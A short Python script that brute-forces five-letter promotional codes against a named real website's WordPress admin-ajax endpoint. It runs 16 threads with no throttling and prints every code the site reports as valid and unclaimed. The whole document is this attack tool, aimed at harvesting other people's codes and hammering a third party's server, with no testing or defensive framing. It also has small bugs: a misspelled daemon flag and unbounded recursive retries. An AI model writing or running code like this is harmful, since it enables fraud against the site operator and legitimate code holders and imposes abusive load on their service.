import string
import itertools
import requests
import queue
import threading
import sys

q = queue.Queue(maxsize=1000)

def test_code(code):
    try:
        r = requests.get("https://sunparks-win.be/wp-admin/admin-ajax.php?action=check_code_exists_ajax&field_val={0}&post_id=17".format(code))
        code_exists = '"codeExists":true' in r.text
        code_taken = '"codeTaken":true' in r.text
        return (code_exists, code_taken)
    except:
        return test_code(code)


def worker():
    while True:
        code = q.get(timeout=20)
        if test_code(code) == (True, False):
            sys.stdout.write("{0}\n".format(code))
            sys.stdout.flush()
        q.task_done()
            

for i in range(16):
    t = threading.Thread(target=worker)
    t.Deamon = True
    t.start()


for x in itertools.product(string.ascii_uppercase, repeat=5):
    code = "".join(x)
    sys.stderr.write("Testing code: {0}\n".format(code))
    q.put(code)
    
